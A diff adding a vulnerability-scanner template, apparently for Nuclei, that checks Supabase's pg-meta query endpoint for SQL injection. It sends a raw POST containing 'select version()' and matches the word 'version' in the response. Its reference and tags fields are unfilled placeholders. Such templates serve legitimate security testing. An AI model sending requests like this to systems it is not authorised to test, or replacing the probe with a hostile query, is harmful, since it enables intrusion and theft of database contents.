@@ -1,0 +1,23 @@
+id: Supabase-query-sqli
+info:
+  name: Supabase-query-sqli
+  author: apple
+  severity: high
+  description: 由于Supabase 后端服务平台/api/pg-meta/default/query对用户传入的数据没有进行校验和过滤，导致攻击者传入的SQL语句直接带入到数据库执行，形成SQL注入，可获取数据库敏感信息，深入利用可获取服务器权限。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /api/pg-meta/default/query HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        {"query":"select version()"}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"version"'
